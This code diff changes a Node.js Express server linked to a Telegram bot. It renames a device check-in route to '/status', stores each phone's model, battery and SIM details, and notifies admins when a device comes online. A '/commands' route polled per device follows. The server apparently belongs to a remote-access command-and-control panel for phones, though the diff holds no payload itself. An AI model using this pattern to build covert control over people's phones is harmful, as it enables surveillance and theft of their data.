@@ -56,16 +56,26 @@ function isAdmin(chatId) {
 
 // ===== EXPRESS ROUTES =====
 
-app.post('/connect', (req, res) => {
-  const { uuid, model, battery, sim1, sim2 } = req.body;
-  if (!uuid) return res.status(400).send('Missing uuid');
+// ===== YEH NAYA CODE HAI =====
+app.post('/status', (req, res) => { // Endpoint changed to /status
+    const { uuid, model, battery, sim1, sim2 } = req.body;
+    if (!uuid) return res.status(400).send('Missing uuid');
 
-  devices.set(uuid, { model, battery, sim1, sim2, lastSeen: Date.now() });
+    const existingDevice = devices.get(uuid);
+    // Notify only if device is new or was offline for more than 60 seconds
+    const wasOffline = !existingDevice || (Date.now() - (existingDevice.lastSeen || 0) >= 60000);
 
-  const msg = `📲 *Device Connected*\n${formatDevice(devices.get(uuid))}\n\n👨‍💻 Developer: ${DEVELOPER}`;
-  ADMIN_IDS.forEach(id => bot.sendMessage(id, msg, { parse_mode: 'Markdown' }).catch(() => {}));
-  res.sendStatus(200);
+    // Update device data
+    devices.set(uuid, { model, battery, sim1, sim2, lastSeen: Date.now() });
+
+    if (wasOffline) {
+        const msg = `📲 *Device Connected / Online*\n${formatDevice(devices.get(uuid))}\n\n👨‍💻 Developer: ${DEVELOPER}`;
+        ADMIN_IDS.forEach(id => bot.sendMessage(id, msg, { parse_mode: 'Markdown' }).catch(() => {}));
+    }
+
+    res.sendStatus(200);
 });
+
 
 app.get('/commands', (req, res) => {
   const uuid = req.query.uuid;
